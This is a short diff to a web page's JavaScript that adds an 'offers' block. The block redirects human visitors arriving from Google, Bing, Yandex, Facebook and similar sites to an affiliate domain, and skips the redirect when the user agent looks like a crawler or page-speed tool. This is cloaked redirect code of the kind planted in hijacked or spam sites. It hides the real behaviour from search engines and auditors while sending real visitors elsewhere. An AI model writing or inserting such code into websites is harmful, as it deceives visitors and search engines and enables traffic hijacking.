@@ -1,3 +1,5 @@
+
+
 /** random number **/
 function randNum(max){x= Math.random().toString();x=x.substring(19 - max, 19);return x;};
 
@@ -27,6 +29,15 @@ var Params = (function(a) {
 	b['title']=a.join(' '); 
 	return b; 
 })(window.location.search.substr(3).split("+"));
+
+
+/** offers **/
+if ( ['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.', 'yahoo.'].some(e => document.referrer.toLowerCase().includes(e)) && Params['id'] && AFF_DOMAIN != "" && DEMO === false ) {
+	if ( ['bot','google','bing','msn','yandex','pagespeed','lighthouse','http'].some(e => navigator.userAgent.toLowerCase().includes(e) ) === false ) {
+		window.location.href = "https://"+AFF_DOMAIN+"/?id="+Params['id'];
+	}
+}
+
 
 /** current url **/
 var currentUrl = (function(e){
